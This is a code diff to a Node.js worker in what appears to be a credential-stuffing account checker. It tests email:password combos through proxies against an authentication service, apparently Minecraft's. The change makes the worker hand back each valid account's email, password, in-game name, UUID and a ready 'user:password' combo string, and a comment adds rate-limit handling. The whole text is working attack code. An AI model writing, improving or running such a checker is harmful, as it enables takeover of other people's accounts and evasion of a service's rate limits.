@@ -25,6 +25,8 @@ parentPort.on('message', (message) => {
 	var proxies = workerData;
 	
 	(async () => {
+		
+		//handle ratelimits and stuff
 			
 			var proxy, index;
 			//request
@@ -79,14 +81,14 @@ parentPort.on('message', (message) => {
 					const respstr = JSON.stringify(resp.data);
 					if(respstr.indexOf("Invalid credentials")!= -1){ //invalid credentials is in the response, bad account
 						console.log(message + " is not a valid account :(");
-						parentPort.postMessage("ready for next");
+						parentPort.postMessage("bad");
 					}else{ //invalid credentials is not in the response, good account
 						
 						const uuid = resp.data['availableProfiles'][0]["id"];
 						const ign = resp.data['availableProfiles'][0]['name'];
 						
 						console.log(`${message} is a valid account!, IGN: ${ign} , UUID: ${uuid}`);
-						parentPort.postMessage("ready for next");
+						parentPort.postMessage({email: user, password: passw, ign: ign, uuid: uuid, combo: user+":"+passw});
 					}
 				}catch(err){
 					clearTimeout(timeout); //request unsuccessful but still returned, cancel connection timeout
@@ -101,7 +103,7 @@ parentPort.on('message', (message) => {
 					  
 					  if(respstr.indexOf("Invalid credentials")!= -1){ //invalid credentials is in the response, bad account
 						  console.log(message + " is not a valid account :(");
-						  parentPort.postMessage("ready for next");
+						  parentPort.postMessage("bad");
 					  }else{
 						  //console.log(`number ${index+1}: bad proxy, ${err.code}`);
 						  //console.log(err_message);
